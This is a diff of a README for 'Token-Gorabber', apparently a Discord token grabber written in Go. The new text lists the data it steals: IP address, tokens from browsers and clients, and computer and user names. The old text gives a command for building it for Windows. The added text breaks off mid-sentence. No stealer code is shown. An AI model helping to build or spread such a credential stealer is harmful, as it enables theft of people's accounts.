@@ -1,11 +1,11 @@
-<h1 align="center">¿What is this?</h1>
-<p align="center">Token-Gorabber Is a Simple Discord Token Grabber written in Go.<br/>Please, use this with intelligence</p>
+#Token Gorabber
+###What is this?
+This is a very simple token grabber written in Go that can grab:
+	- IP ADDRESS
+	- EVERY TOKEN FROM VARIOUS SOURCES LIKE BROWSER OR MANY CLIENTS
+	- COMPUTER'S NAME AND USER NAME
+But just for now...
 
-<br>
+###How do i use it?
+Well, you could
 
-<h1 align="center">so...¿how do i use it?<h1>
-<p align="center">well my dear friend, i feel so bad telling you this but, you can <a href="https://www.wikipedia.com/sexo">compile</a> it using this command:</p>
-```
-GOOS=windows go build main.go
-```
-psdt: if you're on windows then you should skip "GOOS=windows"
